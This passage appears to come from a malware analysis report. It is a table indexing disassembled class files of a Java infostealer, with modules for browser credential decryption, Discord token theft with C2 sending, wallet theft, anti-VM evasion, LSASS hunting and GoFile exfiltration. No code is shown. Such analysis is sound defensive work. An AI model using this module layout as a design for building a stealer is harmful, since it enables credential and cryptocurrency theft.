| `Stage2_EntryPoint_Main.javap` | `a.Main` — entry point, anti-debug |
| `Stage2_Orchestrator_ThreadDispatcher.javap` | `a.b.D` — 18-thread orchestrator |
| `BrowserStealer_Chromium_DPAPI_Firefox_NSS.javap` | Core credential decryptor |
| `BrowserStealer_Firefox_NssLib_JNA.javap` | JNA interface to nss3.dll |
| `BrowserStealer_Firefox_NssSec_JNA.javap` | NSS SECITEM JNA struct |
| `BrowserStealer_Brave.javap` | Brave browser stealer |
| `BrowserStealer_Chrome.javap` | Chrome browser stealer |
| `BrowserStealer_Edge.javap` | Edge browser stealer |
| `BrowserStealer_Firefox.javap` | Firefox browser stealer |
| `BrowserStealer_Opera.javap` | Opera browser stealer |
| `BrowserStealer_OperaGX.javap` | Opera GX browser stealer |
| `BrowserStealer_OperaAir.javap` | Opera Air browser stealer |
| `BrowserStealer_TorBrowser.javap` | Tor Browser stealer |
| `BrowserStealer_Vivaldi.javap` | Vivaldi browser stealer |
| `BrowserStealer_Waterfox.javap` | Waterfox browser stealer |
| `BrowserStealer_Yandex.javap` | Yandex browser stealer |
| `BrowserStealer_ZenBrowser.javap` | Zen Browser stealer |
| `DiscordTokenStealer_AccountProfiler.javap` | Discord token + badge profiler |
| `DiscordTokenStealer_BadgeEnumerator_C2Sender.javap` | Badge enum + C2 POST |
| `AntiVM_SandboxEvasion_HostnameBlocklist.javap` | 400+ entry blocklist |
| `C2_Exfiltration_HTTP_Client.javap` | Java HttpClient C2 comms |
| `Exfil_GoFile_Upload.javap` | GoFile multipart uploader |
| `Exfil_ZipPacker.javap` | ZIP bundle packer |
| `CryptoWallet_DesktopAndExtension_Stealer.javap` | Full wallet stealer |
| `CryptoWallet_ExtensionStealer.javap` | Extension wallet stealer |
| `Mutex_SingleInstance_Guard.javap` | Win32 CreateMutex handler |
| `ProcessEnumerator_LSASS_VMCheck.javap` | Process enum + lsass hunt |
| `Screenshot_Capture.javap` | java.awt.Robot screenshot module |
| `SystemInfo_FileEnumerator.javap` | .txt harvester + sysinfo |
| `CommandExecution_RuntimeExec.javap` | Runtime.exec() module |
| `Crypto_KeyUtility.javap` | Cryptographic key helper |
| `Runtime_DecryptedStrings_AllClasses.txt` | All runtime-decrypted strings from all 29 classes |

---

*Analysis performed 2026-06-22 using static bytecode analysis (javap), LZString JS deobfuscation, and runtime forced class initialization with JVM socket-level network blocking.*
